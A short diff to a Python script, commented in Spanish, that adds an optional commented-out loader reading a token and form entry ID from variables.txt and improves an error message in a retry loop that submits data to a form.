@@ -10,6 +10,22 @@ from os import getcwd, path, remove
 token="$$$$$$$$$$$$$$$$"
 entry="@@@@@@@@@@@@@"
 
+"""
+OPCIONAL SI SE COMPILA EN .exe
+Si existe el archivo variables.txt continua, sino se cierra
+en el archivo, la primera linea contendra el token
+y la segunda contendra los numeros luego de entry.@@@ solo los numeros!!, las demas lineas las ignora.
+lis=[]
+try:
+ with open("variables.txt","r") as f:
+  for line in f.readlines():
+   lis.append(line)
+ token=lis[0].replace('\n','')
+ entry=lis[1].replace('\n','')
+except Exception as e:
+ print("Error variables\n"+str(e))
+ exit()
+"""
 
 
 def forms(key,pcap,dic):
@@ -23,7 +39,7 @@ def forms(key,pcap,dic):
     req=get(url,dataenc)
     break
   except Exception as e:
-      print("UPSS ocurrio un error\n"+e)
+      print("UPSS ocurrio un error\n"+str(e)+"\nReintentando...")
       sleep(15)
       pass
 
